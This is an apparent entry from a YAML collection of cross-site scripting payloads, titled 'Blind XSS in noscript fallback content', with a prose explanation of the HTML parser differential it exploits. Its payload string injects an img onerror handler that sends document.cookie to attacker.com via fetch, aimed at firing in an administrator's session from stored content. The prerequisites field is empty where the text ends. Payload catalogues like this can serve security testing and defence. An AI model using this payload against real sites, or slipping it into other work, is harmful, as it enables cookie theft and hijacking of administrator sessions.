  - id: xss-blind-011
    title: Blind XSS in noscript fallback content
    payload_string: <noscript><p title="</noscript><img src=x onerror=fetch('//attacker.com/'+document.cookie)>">
    how_it_works: 'Noscript elements can contain HTML that is parsed differently depending on whether JavaScript is enabled
      in the browser. When a CMS or admin panel saves and later renders this content in a browser with JavaScript enabled,
      the noscript block is treated as raw HTML, causing the injected onerror handler to execute when the browser attempts
      to load the invalid img src. The payload fires in the admin''s session regardless of any client-side filtering because
      the injection occurs in stored content. This is a classic HTML parser differential attack used in blind XSS scenarios
      where the attack surface is in content storage paths.

      '
    prerequisites:
